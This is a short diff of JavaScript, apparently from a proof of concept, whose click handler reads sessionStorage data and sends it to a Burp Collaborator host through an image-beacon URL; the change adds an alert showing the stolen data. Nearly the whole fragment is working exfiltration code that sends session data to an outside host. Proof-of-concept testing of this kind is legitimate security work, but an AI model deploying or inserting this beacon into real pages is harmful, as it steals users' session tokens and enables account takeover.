@@ -21,6 +21,7 @@ button.onclick = () => {
                 let img = new Image();
                 img.src = `https://ap3uw7o7w6y9ju104k7ul2c03r9ixgl5.burpcollaborator.net/endpoint?data=${encodeURIComponent(sessionData)}`;
                 document.body.appendChild(img); // Optional: Append the image to the DOM
+                alert(sessionData)
             }
         } catch (error) {
             console.error("Error accessing sessionStorage:", error);
